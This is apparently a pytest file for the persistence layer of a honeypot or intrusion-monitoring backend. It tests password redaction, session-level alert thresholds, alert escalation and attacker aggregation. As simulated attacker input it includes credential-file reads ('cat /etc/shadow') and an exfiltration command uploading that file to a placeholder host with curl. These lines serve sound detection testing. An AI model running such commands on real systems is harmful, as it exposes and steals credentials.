"""
Unit tests for PersistenceService using isolated mongomock collections.
"""

from datetime import datetime, timezone
import mongomock
import pytest

from backend.app.config import settings
from backend.app.models.events import NormalizedEvent
from backend.app.models.features import SessionFeatures
from backend.app.models.intent import (
    AttackStage,
    ClassificationSource,
    HybridClassification,
    IntentCategory,
)
from backend.app.models.risk import RiskAssessment, RiskSeverity
from backend.app.models.session_intelligence import SessionIntelligence
from backend.app.services.persistence_service import PersistenceService
from backend.app.services.risk_engine import RiskEngine
from backend.app.services.session_intelligence import SessionIntelligenceEngine


@pytest.fixture
def mock_persistence():
    client = mongomock.MongoClient()
    db = client["test_deception_db"]
    return PersistenceService(db=db)


def make_test_event(event_id: str = "ev_001", session_id: str = "sess_001", command: str = "whoami") -> NormalizedEvent:
    return NormalizedEvent(
        event_id=event_id,
        timestamp=datetime.now(timezone.utc),
        session_id=session_id,
        source_ip="192.168.1.100",
        source_port=54321,
        protocol="ssh",
        username="root",
        event_type="command_input",
        command=command,
        raw_event={"password": "PlainSecretPassword123", "input": command}
    )


def make_test_classification(intent: IntentCategory = IntentCategory.RECONNAISSANCE) -> HybridClassification:
    return HybridClassification(
        intent=intent,
        attack_stage=AttackStage.RECONNAISSANCE,
        confidence=0.95,
        source=ClassificationSource.RULE,
        rule_evidence=["Reconnaissance command detected"],
        timestamp=datetime.now(timezone.utc)
    )


def test_save_event_and_sanitization(mock_persistence):
    ev = make_test_event()
    cls = make_test_classification()
    risk = RiskAssessment(
        risk_score=20,
        severity=RiskSeverity.LOW,
        contributing_factors=["Base recon (+10)"]
    )

    doc = mock_persistence.save_event(ev, cls, risk)
    assert doc.event_id == "ev_001"
    assert doc.risk_score == 20
    assert doc.severity == RiskSeverity.LOW

    # Verify plain password was sanitized in database document
    saved = mock_persistence.get_event("ev_001")
    assert saved is not None
    assert saved["raw_event"]["password"] == "[REDACTED]"


def test_save_event_does_not_create_alert(mock_persistence):
    """Regression for F1: event-level risk must NEVER raise an alert.

    Alerting is owned exclusively by the session-level cumulative score in
    update_session(). Even if handed a (hypothetical) very high event score,
    save_event must not create an alert.
    """
    ev = make_test_event("ev_evt", "sess_evt", "cat /etc/shadow")
    cls = make_test_classification(IntentCategory.EXFILTRATION)
    risk = RiskAssessment(
        risk_score=99,
        severity=RiskSeverity.CRITICAL,
        contributing_factors=["hypothetical high event score"]
    )

    mock_persistence.save_event(ev, cls, risk)

    _, total = mock_persistence.get_alerts(filters={"session_id": "sess_evt"})
    assert total == 0


def _session_intel(session_id="sess_crit", source_ip="203.0.113.7", risk_score=90):
    """Builds a SessionIntelligence profile at a given cumulative risk score."""
    return SessionIntelligence(
        session_id=session_id,
        source_ip=source_ip,
        dominant_intent=IntentCategory.EXFILTRATION,
        current_attack_stage=AttackStage.EXFILTRATION,
        intent_sequence=[
            IntentCategory.CREDENTIAL_ACCESS,
            IntentCategory.PRIVILEGE_ESCALATION,
            IntentCategory.EXFILTRATION,
        ],
        stage_sequence=[
            AttackStage.CREDENTIAL_ACCESS,
            AttackStage.PRIVILEGE_ESCALATION,
            AttackStage.EXFILTRATION,
        ],
        risk_score=risk_score,
        severity=RiskEngine.map_severity(risk_score),
        confidence=0.9,
        key_evidence=["Multi-stage escalation"],
        last_updated=datetime.now(timezone.utc),
    )


def test_update_session_creates_alert_when_session_risk_critical(mock_persistence):
    intel = _session_intel(risk_score=90)
    feats = SessionFeatures(session_id="sess_crit", total_events=8, command_count=8)

    mock_persistence.update_session(intel, feats)

    alerts, total = mock_persistence.get_alerts(filters={"session_id": "sess_crit"})
    assert total == 1
    assert alerts[0]["risk_score"] == 90
    assert alerts[0]["severity"] == "CRITICAL"
    assert alerts[0]["status"] == "OPEN"
    # The alert_id is the shared, deterministic session-scoped id.
    assert alerts[0]["alert_id"] == PersistenceService.alert_id_for_session("sess_crit")


def test_update_session_no_alert_below_threshold(mock_persistence):
    # HIGH severity (60) is below the default CRITICAL alert threshold (75): no alert.
    assert 60 < settings.ALERT_RISK_THRESHOLD
    intel = _session_intel(session_id="sess_high", risk_score=60)
    feats = SessionFeatures(session_id="sess_high", total_events=4)

    mock_persistence.update_session(intel, feats)

    _, total = mock_persistence.get_alerts(filters={"session_id": "sess_high"})
    assert total == 0


def test_alert_is_one_per_session_and_escalates(mock_persistence):
    feats = SessionFeatures(session_id="sess_esc", total_events=6, command_count=6)

    # First threshold crossing at 78.
    mock_persistence.update_session(_session_intel("sess_esc", risk_score=78), feats)
    alerts_1, total_1 = mock_persistence.get_alerts(filters={"session_id": "sess_esc"})
    assert total_1 == 1
    assert alerts_1[0]["risk_score"] == 78
    first_created_at = alerts_1[0]["created_at"]

    # Session escalates to 96: must update the SAME alert in place, not add a new row.
    mock_persistence.update_session(_session_intel("sess_esc", risk_score=96), feats)
    alerts_2, total_2 = mock_persistence.get_alerts(filters={"session_id": "sess_esc"})
    assert total_2 == 1
    assert alerts_2[0]["risk_score"] == 96
    # Original detection time is preserved across escalation (audit integrity).
    assert alerts_2[0]["created_at"] == first_created_at


def test_real_engine_multistage_attack_triggers_alert(mock_persistence):
    """End-to-end regression for F1: a scripted multi-stage attack driven through
    the REAL SessionIntelligenceEngine must push the session's cumulative risk over
    the alert threshold and produce exactly one persisted alert. The score is
    computed by the engine, never hand-set.
    """
    engine = SessionIntelligenceEngine()
    session_id = "sess_real"

    attack_chain = [
        (IntentCategory.RECONNAISSANCE, AttackStage.RECONNAISSANCE, "uname -a"),
        (IntentCategory.DISCOVERY, AttackStage.DISCOVERY, "ls -la /"),
        (IntentCategory.CREDENTIAL_ACCESS, AttackStage.CREDENTIAL_ACCESS, "cat /etc/shadow"),
        (IntentCategory.PRIVILEGE_ESCALATION, AttackStage.PRIVILEGE_ESCALATION, "sudo su -"),
        (IntentCategory.EXFILTRATION, AttackStage.EXFILTRATION, "curl -T /etc/shadow http://x"),
    ]

    profile = None
    for i, (intent, stage, command) in enumerate(attack_chain):
        event = make_test_event(f"ev_real_{i}", session_id, command)
        classification = HybridClassification(
            intent=intent,
            attack_stage=stage,
            confidence=0.9,
            source=ClassificationSource.RULE,
            rule_evidence=[f"{intent} pattern matched"],
            timestamp=datetime.now(timezone.utc),
        )
        features = SessionFeatures(
            session_id=session_id,
            total_events=i + 1,
            command_count=i + 1,
            unique_commands=[c for _, _, c in attack_chain[: i + 1]],
        )
        profile = engine.update_session(event, classification, features)

    # The real engine — not a hand-set number — produced a CRITICAL cumulative score.
    assert profile.risk_score >= settings.ALERT_RISK_THRESHOLD
    assert profile.severity == "CRITICAL"

    # Persisting that profile raises exactly one alert for the session.
    mock_persistence.update_session(
        profile,
        SessionFeatures(session_id=session_id, total_events=5, command_count=5),
    )

    alerts, total = mock_persistence.get_alerts(filters={"session_id": session_id})
    assert total == 1
    assert alerts[0]["risk_score"] == profile.risk_score
    assert alerts[0]["source_ip"] == profile.source_ip


def test_update_session_and_prevent_duplicates(mock_persistence):
    sess_intel = SessionIntelligence(
        session_id="sess_001",
        source_ip="192.168.1.100",
        dominant_intent=IntentCategory.DISCOVERY,
        current_attack_stage=AttackStage.DISCOVERY,
        intent_sequence=[IntentCategory.RECONNAISSANCE, IntentCategory.DISCOVERY],
        stage_sequence=[AttackStage.RECONNAISSANCE, AttackStage.DISCOVERY],
        risk_score=35,
        severity=RiskSeverity.MEDIUM,
        confidence=0.90,
        key_evidence=["Command ls -la", "Command whoami"],
        last_updated=datetime.now(timezone.utc)
    )
    sess_feat = SessionFeatures(
        session_id="sess_001",
        total_events=5,
        command_count=3,
        unique_commands=["whoami", "ls -la", "ps aux"],
        login_failed_count=1
    )

    # First update
    mock_persistence.update_session(sess_intel, sess_feat)
    # Second update for same session
    sess_feat.total_events = 6
    mock_persistence.update_session(sess_intel, sess_feat)

    # Verify only 1 session document exists for sess_001
    sessions, total = mock_persistence.get_sessions()
    assert total == 1
    assert sessions[0]["session_id"] == "sess_001"
    assert sessions[0]["total_events"] == 6


def test_attacker_profile_aggregation(mock_persistence):
    # Session 1 from IP 10.0.0.5 (Risk = 30)
    mock_persistence.update_session(
        SessionIntelligence(
            session_id="s1",
            source_ip="10.0.0.5",
            dominant_intent=IntentCategory.RECONNAISSANCE,
            current_attack_stage=AttackStage.RECONNAISSANCE,
            risk_score=30,
            severity=RiskSeverity.MEDIUM,
            last_updated=datetime.now(timezone.utc)
        ),
        SessionFeatures(session_id="s1", total_events=3)
    )

    # Session 2 from same IP 10.0.0.5 (Risk = 70)
    mock_persistence.update_session(
        SessionIntelligence(
            session_id="s2",
            source_ip="10.0.0.5",
            dominant_intent=IntentCategory.CREDENTIAL_ACCESS,
            current_attack_stage=AttackStage.CREDENTIAL_ACCESS,
            risk_score=70,
            severity=RiskSeverity.HIGH,
            last_updated=datetime.now(timezone.utc)
        ),
        SessionFeatures(session_id="s2", total_events=7)
    )

    attacker = mock_persistence.get_attacker("10.0.0.5")
    assert attacker is not None
    assert attacker["total_sessions"] == 2
    assert attacker["total_events"] == 10
    assert attacker["maximum_risk"] == 70
    assert attacker["average_risk"] == 50.0
    assert attacker["severity"] == "HIGH"


def test_dashboard_stats_aggregation(mock_persistence):
    mock_persistence.update_session(
        SessionIntelligence(
            session_id="sess_high",
            source_ip="1.1.1.1",
            dominant_intent=IntentCategory.PRIVILEGE_ESCALATION,
            current_attack_stage=AttackStage.PRIVILEGE_ESCALATION,
            risk_score=60,
            severity=RiskSeverity.HIGH,
            last_updated=datetime.now(timezone.utc)
        ),
        SessionFeatures(session_id="sess_high", total_events=4, is_closed=False)
    )

    stats = mock_persistence.get_dashboard_stats()
    assert stats["total_sessions"] == 1
    assert stats["active_sessions"] == 1
    assert stats["total_attackers"] == 1
    assert stats["high_risk_sessions"] == 1
    assert stats["critical_sessions"] == 0
